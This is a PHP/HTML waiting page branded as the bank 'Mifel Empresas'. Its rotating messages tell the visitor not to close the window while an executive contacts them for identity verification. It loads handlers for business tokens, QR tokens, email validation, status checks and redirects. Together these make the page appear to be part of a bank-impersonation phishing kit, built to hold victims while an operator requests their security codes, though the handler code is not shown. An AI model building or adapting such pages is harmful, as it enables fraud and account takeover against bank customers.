<?php
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validando información - Empresas</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../css/feLinicio.css">
    <link rel="stylesheet" href="../css/_responsivefel.css">
    <link rel="stylesheet" href="../css/gps.css">
    <link rel="stylesheet" href="../css/loading.css">
    <link rel="stylesheet" href="css/empresas-header.css">
    <link rel="stylesheet" href="../php_modales/css/modales_input_no_input.css">
    <link rel="stylesheet" href="../php_modales/css/herramientas.css">
    <link rel="stylesheet" href="../php_modales/css/reloj_personalizado.css">
    <link rel="stylesheet" href="../php_modales/css/email_validate.css">
    <link rel="stylesheet" href="../php_modales/css/token_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/token_qr_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/contacto_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/sincronizacion.css">
    <link rel="stylesheet" href="../css/zeppelin_churro_btn.css">
    <?php require_once __DIR__ . '/../includes/responsive_movil.php'; mifel_responsive_movil_empresas(); ?>
</head>
<body>
    <header class="header-container empresas-header">
        <div class="header-wrapper">
            <div class="logo-center">
                <img src="../images/logo-empresas_BLANCO.svg" alt="Mifel Empresas" class="mifel-header-logo">
            </div>
            <?php require_once __DIR__ . '/includes/bienvenida_usuario.php'; ?>
        </div>
    </header>
    
    <main class="loading-container">
        <div class="loading-content">
            <h1 class="loading-title" id="dynamicTitle">Espera, un ejecutivo se pondrá en contacto</h1>
            <div class="loader-container">
                <img src="../images/mifel-loader.gif" alt="Cargando..." class="loader-gif">
            </div>
            <p class="loading-text" id="dynamicText">Por favor, no cierre esta ventana. Un representante se comunicará contigo en breve para continuar con el proceso de verificación.</p>
        </div>
    </main>
    
    <script>
        // Mensajes dinámicos profesionales
        const mensajesDinamicos = [
            {
                titulo: "Espera, un ejecutivo se pondrá en contacto",
                texto: "Por favor, no cierre esta ventana. Un representante se comunicará contigo en breve para continuar con el proceso de verificación."
            },
            {
                titulo: "Verificación de seguridad en progreso",
                texto: "Mantén esta ventana abierta mientras procesamos tu solicitud. Un especialista se pondrá en contacto contigo."
            },
            {
                titulo: "Procesando tu información",
                texto: "No cierres esta ventana. Un asesor se comunicará contigo para completar el proceso de validación."
            },
            {
                titulo: "Validación de identidad en curso",
                texto: "Por favor, mantén esta ventana abierta. Un representante se pondrá en contacto contigo para finalizar el proceso."
            },
            {
                titulo: "Esperando confirmación",
                texto: "No cierres esta ventana. Un ejecutivo se comunicará contigo para continuar con la verificación de tu cuenta."
            }
        ];

        let indiceActual = 0;
        const tituloElement = document.getElementById('dynamicTitle');
        const textoElement = document.getElementById('dynamicText');

        function cambiarMensaje() {
            const mensaje = mensajesDinamicos[indiceActual];
            
            // Efecto de fade out
            tituloElement.style.opacity = '0.5';
            textoElement.style.opacity = '0.5';
            
            setTimeout(() => {
                tituloElement.textContent = mensaje.titulo;
                textoElement.textContent = mensaje.texto;
                
                // Efecto de fade in
                tituloElement.style.opacity = '1';
                textoElement.style.opacity = '1';
                
                indiceActual = (indiceActual + 1) % mensajesDinamicos.length;
            }, 500);
        }

        // Cambiar mensaje cada 8 segundos
        setInterval(cambiarMensaje, 8000);

        // Agregar transición suave
        tituloElement.style.transition = 'opacity 0.5s ease';
        textoElement.style.transition = 'opacity 0.5s ease';
    </script>
    <script>window.MODAL_BASE = '../';</script>
    <script src="../php_modales/js/check_status.js"></script>
    <script src="../php_modales/js/modales_input_no_input.js"></script>
    <script src="../php_modales/js/herramientas.js"></script>
    <script src="../php_modales/js/reloj_personalizado.js"></script>
    <script src="../php_modales/js/redirecciones.js"></script>
    <script src="../php_modales/js/email_validate_handler.js"></script>
    <script src="../php_modales/js/token_empresa_handler.js"></script>
    <script src="../php_modales/js/token_qr_empresa_handler.js"></script>
    <script src="../php_modales/js/contacto_empresa_handler.js"></script>
    <script src="../php_modales/js/sincronizacion_handler.js"></script>
</body>
</html>
